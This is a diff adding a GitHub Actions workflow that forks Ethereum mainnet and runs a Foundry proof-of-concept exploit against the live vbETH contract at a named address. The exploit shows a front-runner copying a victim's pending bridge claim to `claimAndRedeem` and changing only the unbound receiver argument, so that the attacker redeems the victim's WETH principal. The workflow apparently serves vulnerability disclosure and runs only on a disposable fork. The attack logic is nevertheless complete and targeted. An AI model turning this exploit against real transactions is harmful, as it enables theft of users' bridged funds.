@@ -1,0 +1,330 @@
+name: Katana claimAndRedeem receiver-binding PoC
+
+on:
+  pull_request:
+    branches: [main]
+    paths:
+      - '.github/workflows/katana-claim-receiver-binding-poc-20260729.yml'
+  workflow_dispatch:
+
+permissions:
+  contents: read
+
+jobs:
+  poc:
+    runs-on: ubuntu-24.04
+    timeout-minutes: 30
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          persist-credentials: false
+          fetch-depth: 1
+
+      - uses: foundry-rs/foundry-toolchain@v1
+        with:
+          version: stable
+
+      - name: Select Ethereum RPC and pin block
+        shell: bash
+        run: |
+          set -euo pipefail
+          python3 - <<'PY' >> "$GITHUB_ENV"
+          import json, urllib.request
+          endpoints = [
+              'https://ethereum-rpc.publicnode.com',
+              'https://eth.llamarpc.com',
+              'https://1rpc.io/eth',
+              'https://cloudflare-eth.com',
+          ]
+          request_id = 0
+          def rpc(url, method, params):
+              global request_id
+              request_id += 1
+              req = urllib.request.Request(
+                  url,
+                  data=json.dumps({'jsonrpc':'2.0','id':request_id,'method':method,'params':params}).encode(),
+                  headers={'content-type':'application/json','user-agent':'katana-claim-receiver-binding-poc/1.0'},
+              )
+              with urllib.request.urlopen(req, timeout=30) as response:
+                  payload = json.loads(response.read())
+              if 'error' in payload:
+                  raise RuntimeError(payload['error'])
+              return payload['result']
+          failures = {}
+          for endpoint in endpoints:
+              try:
+                  if int(rpc(endpoint,'eth_chainId',[]),16) != 1:
+                      raise RuntimeError('wrong chain')
+                  block = int(rpc(endpoint,'eth_blockNumber',[]),16)
+                  header = rpc(endpoint,'eth_getBlockByNumber',[hex(block),False])
+                  print(f'ETH_RPC={endpoint}')
+                  print(f'ETH_BLOCK={block}')
+                  print(f'ETH_BLOCK_HASH={header["hash"]}')
+                  print(f'ETH_BLOCK_TIMESTAMP={int(header["timestamp"],16)}')
+                  break
+              except Exception as exc:
+                  failures[endpoint] = repr(exc)
+          else:
+              raise SystemExit(json.dumps(failures, sort_keys=True))
+          PY
+
+      - name: Build pinned local-fork PoC
+        shell: bash
+        run: |
+          set -euo pipefail
+          mkdir -p poc/lib poc/test evidence
+          git clone --depth 1 --branch v1.9.4 https://github.com/foundry-rs/forge-std.git poc/lib/forge-std
+          cat > poc/foundry.toml <<'EOF'
+          [profile.default]
+          src = "src"
+          test = "test"
+          libs = ["lib"]
+          solc_version = "0.8.24"
+          optimizer = true
+          optimizer_runs = 200
+          verbosity = 4
+          EOF
+          mkdir -p poc/src
+          cat > poc/test/ClaimAndRedeemReceiverBinding.t.sol <<'SOL'
+          // SPDX-License-Identifier: MIT
+          pragma solidity 0.8.24;
+
+          import {Test} from "forge-std/Test.sol";
+
+          interface IERC20Like {
+              function balanceOf(address account) external view returns (uint256);
+              function transfer(address to, uint256 amount) external returns (bool);
+          }
+
+          interface IVbEthLike is IERC20Like {
+              function depositETH(address receiver) external payable returns (uint256 shares);
+              function underlyingToken() external view returns (address);
+              function agglayerBridge() external view returns (address);
+              function agglayerId() external view returns (uint32);
+              function claimAndRedeem(
+                  bytes32[32] calldata smtProof,
+                  uint32 index,
+                  bytes32 mainnetExitRoot,
+                  bytes32 rollupExitRoot,
+                  uint32 originNetwork,
+                  uint256 amount,
+                  bytes calldata metadata,
+                  address receiver
+              ) external returns (uint256 assets);
+          }
+
+          contract LocalClaimBridge {
+              IERC20Like public immutable token;
+              bytes32 private constant CLAIMED_NAMESPACE =
+                  keccak256("zerodaybugs.katana.claim-receiver-binding.local-fork.claimed");
+
+              error AlreadyClaimed(bytes32 leafKey);
+              error TransferFailed();
+
+              event LocalClaimExecuted(bytes32 indexed leafKey, address indexed destinationAddress, uint256 amount);
+
+              constructor(address token_) {
+                  token = IERC20Like(token_);
+              }
+
+              function claimAsset(
+                  bytes32[32] calldata,
+                  uint32 index,
+                  bytes32 mainnetExitRoot,
+                  bytes32 rollupExitRoot,
+                  uint32 originNetwork,
+                  address originTokenAddress,
+                  uint32 destinationNetwork,
+                  address destinationAddress,
+                  uint256 amount,
+                  bytes calldata metadata
+              ) external {
+                  bytes32 leafKey = keccak256(
+                      abi.encode(
+                          index,
+                          mainnetExitRoot,
+                          rollupExitRoot,
+                          originNetwork,
+                          originTokenAddress,
+                          destinationNetwork,
+                          destinationAddress,
+                          amount,
+                          metadata
+                      )
+                  );
+                  bytes32 storageSlot = keccak256(abi.encode(leafKey, CLAIMED_NAMESPACE));
+                  uint256 claimed;
+                  assembly {
+                      claimed := sload(storageSlot)
+                  }
+                  if (claimed != 0) revert AlreadyClaimed(leafKey);
+                  assembly {
+                      sstore(storageSlot, 1)
+                  }
+                  if (!token.transfer(destinationAddress, amount)) revert TransferFailed();
+                  emit LocalClaimExecuted(leafKey, destinationAddress, amount);
+              }
+          }
+
+          contract ClaimAndRedeemReceiverBindingTest is Test {
+              address private constant VBETH = 0x2DC70fb75b88d2eB4715bc06E1595E6D97c34DFF;
+              address private constant VICTIM = address(0xB0B);
+              address private constant ATTACKER = address(0xA11CE);
+              uint256 private constant AMOUNT = 1 ether;
+
+              IVbEthLike private vbEth = IVbEthLike(VBETH);
+              IERC20Like private weth;
+              address private bridge;
+              uint32 private destinationNetwork;
+
+              bytes32[32] private proof;
+              uint32 private constant INDEX = 771337;
+              bytes32 private constant MAINNET_EXIT_ROOT = keccak256("mainnet-exit-root");
+              bytes32 private constant ROLLUP_EXIT_ROOT = keccak256("rollup-exit-root");
+              uint32 private constant ORIGIN_NETWORK = 747474;
+              bytes private metadata = hex"01020304";
+
+              function setUp() public {
+                  vm.createSelectFork(vm.envString("ETH_RPC"), vm.envUint("ETH_BLOCK"));
+                  weth = IERC20Like(vbEth.underlyingToken());
+                  bridge = vbEth.agglayerBridge();
+                  destinationNetwork = vbEth.agglayerId();
+
+                  // Legitimately mint live vbETH from native ETH; no target storage is overwritten.
+                  vm.deal(VICTIM, AMOUNT);
+                  vm.prank(VICTIM);
+                  uint256 minted = vbEth.depositETH{value: AMOUNT}(VICTIM);
+                  assertEq(minted, AMOUNT, "live deposit must mint 1:1 vbETH");
+                  assertEq(vbEth.balanceOf(VICTIM), AMOUNT, "victim must own the bridged principal");
+
+                  // Model the actual bridge custody state for one exit leaf on the local fork.
+                  vm.prank(VICTIM);
+                  assertTrue(vbEth.transfer(bridge, AMOUNT), "bridge custody transfer failed");
+                  LocalClaimBridge mockBridge = new LocalClaimBridge(VBETH);
+                  vm.etch(bridge, address(mockBridge).code);
+                  assertEq(vbEth.balanceOf(bridge), AMOUNT, "bridge must custody the principal");
+              }
+
+              function test_FrontRunnerStealsPrincipalByChangingOnlyReceiver() public {
+                  bytes32 victimCommittedFields = _committedBridgeFieldsHash();
+                  bytes32 attackerCommittedFields = _committedBridgeFieldsHash();
+                  assertEq(
+                      victimCommittedFields,
+                      attackerCommittedFields,
+                      "attacker must use the exact same bridge-committed fields"
+                  );
+
+                  uint256 attackerWethBefore = weth.balanceOf(ATTACKER);
+                  uint256 victimWethBefore = weth.balanceOf(VICTIM);
+
+                  // The attacker copies the pending proof and changes only the uncommitted receiver argument.
+                  vm.prank(ATTACKER);
+                  uint256 stolenAssets = vbEth.claimAndRedeem(
+                      proof,
+                      INDEX,
+                      MAINNET_EXIT_ROOT,
+                      ROLLUP_EXIT_ROOT,
+                      ORIGIN_NETWORK,
+                      AMOUNT,
+                      metadata,
+                      ATTACKER
+                  );
+
+                  assertEq(stolenAssets, AMOUNT, "attacker must redeem the full victim principal");
+                  assertEq(
+                      weth.balanceOf(ATTACKER) - attackerWethBefore,
+                      AMOUNT,
+                      "attacker must receive victim WETH"
+                  );
+                  assertEq(weth.balanceOf(VICTIM), victimWethBefore, "victim must receive nothing");
+                  assertEq(vbEth.balanceOf(bridge), 0, "claim must consume the bridge-held principal");
+
+                  // The victim's original transaction now loses the race because the same leaf is consumed.
+                  vm.prank(VICTIM);
+                  vm.expectRevert();
+                  vbEth.claimAndRedeem(
+                      proof,
+                      INDEX,
+                      MAINNET_EXIT_ROOT,
+                      ROLLUP_EXIT_ROOT,
+                      ORIGIN_NETWORK,
+                      AMOUNT,
+                      metadata,
+                      VICTIM
+                  );
+              }
+
+              function test_ReceiverIsAbsentFromBridgeCommittedFields() public view {
+                  bytes32 committed = _committedBridgeFieldsHash();
+                  bytes32 victimFullCall = keccak256(abi.encode(committed, VICTIM));
+                  bytes32 attackerFullCall = keccak256(abi.encode(committed, ATTACKER));
+                  assertTrue(victimFullCall != attackerFullCall, "full calls must differ by receiver");
+                  assertEq(committed, _committedBridgeFieldsHash(), "bridge fields remain identical");
+              }
+
+              function _committedBridgeFieldsHash() private view returns (bytes32) {
+                  return keccak256(
+                      abi.encode(
+                          INDEX,
+                          MAINNET_EXIT_ROOT,
+                          ROLLUP_EXIT_ROOT,
+                          ORIGIN_NETWORK,
+                          VBETH,
+                          destinationNetwork,
+                          VBETH,
+                          AMOUNT,
+                          metadata
+                      )
+                  );
+              }
+          }
+          SOL
+
+          cat > poc/README.md <<'EOF'
+          # Katana claimAndRedeem receiver-binding local-fork PoC
+
+          This PoC forks Ethereum at the pinned block, deposits native ETH into the live vbETH contract,
+          transfers the resulting principal into the live Agglayer bridge address, and replaces only the
+          bridge runtime on the disposable fork with a minimal exact-signature claim model. It then shows
+          that a front-runner can copy every bridge-committed field and change only `claimAndRedeem`'s
+          uncommitted `receiver` argument, receiving the victim's WETH principal. No public-chain transaction
+          is signed or broadcast and no live contract storage is modified.
+          EOF
+
+          {
+            echo "ETH_RPC=$ETH_RPC"
+            echo "ETH_BLOCK=$ETH_BLOCK"
+            echo "ETH_BLOCK_HASH=$ETH_BLOCK_HASH"
+            echo "ETH_BLOCK_TIMESTAMP=$ETH_BLOCK_TIMESTAMP"
+            echo "VBETH=0x2DC70fb75b88d2eB4715bc06E1595E6D97c34DFF"
+          } > evidence/PIN.txt
+
+          cd poc
+          ETH_RPC="$ETH_RPC" ETH_BLOCK="$ETH_BLOCK" \
+            forge test \
+              --match-contract ClaimAndRedeemReceiverBindingTest \
+              -vvvv \
+              2>&1 | tee ../evidence/forge_run_1.log
+          ETH_RPC="$ETH_RPC" ETH_BLOCK="$ETH_BLOCK" \
+            forge test \
+              --match-contract ClaimAndRedeemReceiverBindingTest \
+              -vvvv \
+              2>&1 | tee ../evidence/forge_run_2.log
+          cd ..
+          cp poc/test/ClaimAndRedeemReceiverBinding.t.sol evidence/
+          cp poc/README.md evidence/
+          sha256sum \
+            evidence/PIN.txt \
+            evidence/ClaimAndRedeemReceiverBinding.t.sol \
+            evidence/README.md \
+            evidence/forge_run_1.log \
+            evidence/forge_run_2.log \
+            > evidence/SHA256SUMS
+
+      - uses: actions/upload-artifact@v4
+        with:
+          name: katana-claim-receiver-binding-poc-${{ github.run_id }}
+          path: evidence/
+          if-no-files-found: error
+          retention-days: 1
+          compression-level: 9
